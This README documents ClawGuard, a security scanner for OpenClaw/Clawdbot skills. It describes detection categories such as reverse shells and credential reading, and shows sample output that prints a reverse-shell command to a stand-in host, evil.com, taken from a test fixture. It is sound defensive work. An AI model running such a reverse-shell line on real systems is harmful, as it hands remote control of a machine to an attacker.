# 🛡️ ClawGuard

**Security Scanner for OpenClaw/Clawdbot Skills**

Protect yourself from malicious skill installations. ClawGuard scans skills for dangerous patterns before you install them - including patterns from the **ClawHavoc campaign** (341 malicious skills discovered by Koi Security).

## Quick Start

```bash
# Clone the repo
git clone https://github.com/devinfloyd1/clawguard.git
cd clawguard

# Scan a skill by name
python scan.py --skill github

# Scan a skill by path
python scan.py --path /path/to/skill

# Scan all installed skills
python scan.py --all
```

## What It Detects

| Category | Examples | Severity |
|----------|----------|----------|
| 🔴 **Reverse Shells** | socket.connect(), pty.spawn(), /dev/tcp | Critical |
| 🔴 **Data Exfiltration** | requests.post() to suspicious TLDs | Critical |
| 🔴 **Credential Harvest** | Reading ~/.ssh/id_rsa, AWS credentials | Critical |
| 🔴 **Obfuscation** | base64.b64decode(exec), chr() chains | Critical |
| 🔴 **ClawHavoc IOCs** | glot.io scripts, fake Apple URLs, known C2 IPs | Critical |
| 🟠 **Code Execution** | exec(), eval(), subprocess | High |
| 🟡 **Suspicious Network** | URL shorteners, weird ports | Medium |
| 🟡 **Environment Access** | os.environ, os.getenv | Medium |
| ⚪ **Minor Issues** | Unused imports, long lines | Info |

## Output Formats

```bash
# Console (default) - colored terminal output
python scan.py --skill github

# JSON - machine-readable for CI/CD
python scan.py --skill github --format json

# Markdown - for sharing reports
python scan.py --skill github --format markdown
```

## Risk Scoring

| Score | Level | Action |
|-------|-------|--------|
| 0-10 | 🟢 Safe | Install freely |
| 11-25 | 🟢 Low | Quick review |
| 26-50 | 🟡 Medium | Review findings |
| 51-75 | 🔴 High | Review carefully |
| 76-100 | 🔴 Critical | **Do not install** |

## Example Output

```
╔══════════════════════════════════════════════════════════════╗
║                    ClawGuard Scan Report                     ║
╠══════════════════════════════════════════════════════════════╣
║ Skill:     malicious_skill_revshell                          ║
║ Path:      tests/fixtures/malicious_skill_revshell           ║
║ Files:     2 files, 38 lines                                 ║
║ Risk:      100/100 [CRITICAL] ████████████████████           ║
╚══════════════════════════════════════════════════════════════╝

CRITICAL   [CH-002] Subprocess spawning a shell - high likelihood of reverse shell
├── File: main.py:17
├── Code: subprocess.call(["/bin/bash", "-i"])
├── Category: remote_access
├── Confidence: high
└── Action: DO NOT INSTALL. This skill contains dangerous code.

CRITICAL   [CH-003] System call with netcat or interactive bash
├── File: main.py:22
├── Code: os.system('bash -i >& /dev/tcp/evil.com/9001 0>&1')
├── Category: remote_access
├── Confidence: high
└── Action: DO NOT INSTALL. This skill contains dangerous code.

────────────────────────────────────────────────────────────────
Summary: 4 critical, 4 high, 1 medium
Recommendation: DO NOT INSTALL — Critical findings detected
────────────────────────────────────────────────────────────────
```

## Project Structure

```
clawguard/
├── scan.py                 # CLI entry point
├── engine/
│   ├── scanner.py          # Core orchestration
│   ├── pattern_matcher.py  # Regex IOC matching
│   ├── ast_analyzer.py     # Python AST analysis
│   ├── network_analyzer.py # URL/IP detection
│   ├── obfuscation_detector.py
│   └── permission_checker.py
├── reporters/
│   ├── console_reporter.py
│   ├── json_reporter.py
│   └── markdown_reporter.py
├── iocs/
│   └── clawhavoc_indicators.json  # 70+ IOC patterns
└── tests/
    └── fixtures/           # Test skills
```

## IOC Database

70+ indicators of compromise across categories:
- Remote access (reverse shells, C2)
- Data exfiltration
- Credential harvesting
- Code execution
- Obfuscation techniques
- Network anomalies
- **Real ClawHavoc campaign IOCs** (from Koi Security research)
- Known malicious IPs, hashes, and skill names

## Requirements

- Python 3.8+
- No external dependencies (stdlib only)

## Credits

IOCs enriched with research from [Koi Security](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting) - ClawHavoc campaign analysis by Oren Yomtov and Alex.

## License

MIT

---

**Built for the Clawdbot community** 🐾
